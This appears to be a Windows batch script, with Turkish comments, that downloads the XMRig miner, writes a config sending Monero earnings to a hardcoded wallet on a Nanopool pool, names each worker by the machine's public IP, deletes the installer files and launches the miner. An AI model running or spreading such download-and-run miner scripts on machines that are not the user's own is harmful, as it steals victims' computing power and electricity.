@echo off
setlocal enabledelayedexpansion

:: Değişkenler
set "XMRIG_URL=https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
set "ZIP_NAME=xmrig.zip"
set "EXTRACT_FOLDER=xmrig-6.21.0"
set "TARGET_FOLDER=fatsa"
set "WALLET=4A2ffGj3RJBXj7VCQzseUNNNfQKUuj92xek9zQ87XRvN4gJzouDRtWjZZvzpupyaxFfTtgxW6i1ThXzVYEKTDYsY5wEHf54"
set "POOL=xmr-eu1.nanopool.org:14444"

echo [+] XMRig indiriliyor...
curl -L -o %ZIP_NAME% %XMRIG_URL%

echo [+] Zipten cikariliyor...
powershell -Command "Expand-Archive -Path '%ZIP_NAME%' -DestinationPath '.' -Force"

echo [+] Fatsa klasoru hazirlaniyor...
if not exist %TARGET_FOLDER% mkdir %TARGET_FOLDER%
xcopy /E /I /Y %EXTRACT_FOLDER%\* %TARGET_FOLDER%\

echo [+] IP adresi aliniyor...
for /f "delims=" %%i in ('powershell -Command "(Invoke-WebRequest -Uri 'https://ident.me').Content.Trim()"') do set "IP=%%i"

set "FULL_USER=%WALLET%.%IP%"

echo [+] Tam Config.json olusturuluyor...
(
echo {
echo     "api": { "id": null, "worker-id": null },
echo     "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
echo     "autosave": true,
echo     "background": false,
echo     "colors": true,
echo     "title": true,
echo     "randomx": { "init": -1, "init-avx2": -1, "mode": "auto", "1gb-pages": false, "rdmsr": true, "wrmsr": true, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 },
echo     "cpu": {
echo         "enabled": true, "huge-pages": true, "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "asm": true, "argon2-impl": null,
echo         "argon2": [0, 1, 2, 3, 4, 5, 6, 7],
echo         "cn": [[1, 0], [1, 1], [1, 2], [1, 3], [1, 4], [1, 5], [1, 6], [1, 7]],
echo         "cn-heavy": [[1, 0], [1, 1], [1, 2], [1, 3], [1, 4], [1, 5], [1, 6], [1, 7]],
echo         "cn-lite": [[1, 0], [1, 1], [1, 2], [1, 3], [1, 4], [1, 5], [1, 6], [1, 7]],
echo         "cn-pico": [[2, 0], [2, 1], [2, 2], [2, 3], [2, 4], [2, 5], [2, 6], [2, 7]],
echo         "cn/upx2": [[2, 0], [2, 1], [2, 2], [2, 3], [2, 4], [2, 5], [2, 6], [2, 7]],
echo         "ghostrider": [[8, 0], [8, 1], [8, 2], [8, 3], [8, 4], [8, 5], [8, 6], [8, 7]],
echo         "rx": [0, 1, 2, 3, 4, 5, 6, 7], "rx/wow": [0, 1, 2, 3, 4, 5, 6, 7], "cn-lite/0": false, "cn/0": false, "rx/arq": "rx/wow"
echo     },
echo     "opencl": { "enabled": false, "cache": true, "loader": null, "platform": "AMD", "adl": true, "cn-lite/0": false, "cn/0": false },
echo     "cuda": { "enabled": false, "loader": null, "nvml": true, "cn-lite/0": false, "cn/0": false },
echo     "log-file": null,
echo     "donate-level": 1,
echo     "donate-over-proxy": 1,
echo     "pools": [
echo         {
echo             "algo": "rx/0",
echo             "coin": null,
echo             "url": "%POOL%",
echo             "user": "%FULL_USER%",
echo             "pass": "x",
echo             "rig-id": null,
echo             "nicehash": false,
echo             "keepalive": false,
echo             "enabled": true,
echo             "tls": false,
echo             "sni": false,
echo             "tls-fingerprint": null,
echo             "daemon": false,
echo             "socks5": null,
echo             "self-select": null,
echo             "submit-to-origin": false
echo         }
echo     ],
echo     "retries": 5,
echo     "retry-pause": 5,
echo     "print-time": 60,
echo     "health-print-time": 5,
echo     "dmi": true,
echo     "syslog": false,
echo     "tls": { "enabled": false, "protocols": null, "cert": null, "cert_key": null, "ciphers": null, "ciphersuites": null, "dhparam": null },
echo     "dns": { "ip_version": 0, "ttl": 30 },
echo     "user-agent": null,
echo     "verbose": 0,
echo     "watch": true,
echo     "pause-on-battery": false,
echo     "pause-on-active": false
echo }
) > "%TARGET_FOLDER%\config.json"

echo [+] Temizlik yapiliyor...
rd /S /Q %EXTRACT_FOLDER%
del %ZIP_NAME%

echo [+] Baslatiliyor...
cd %TARGET_FOLDER%
start xmrig.exe
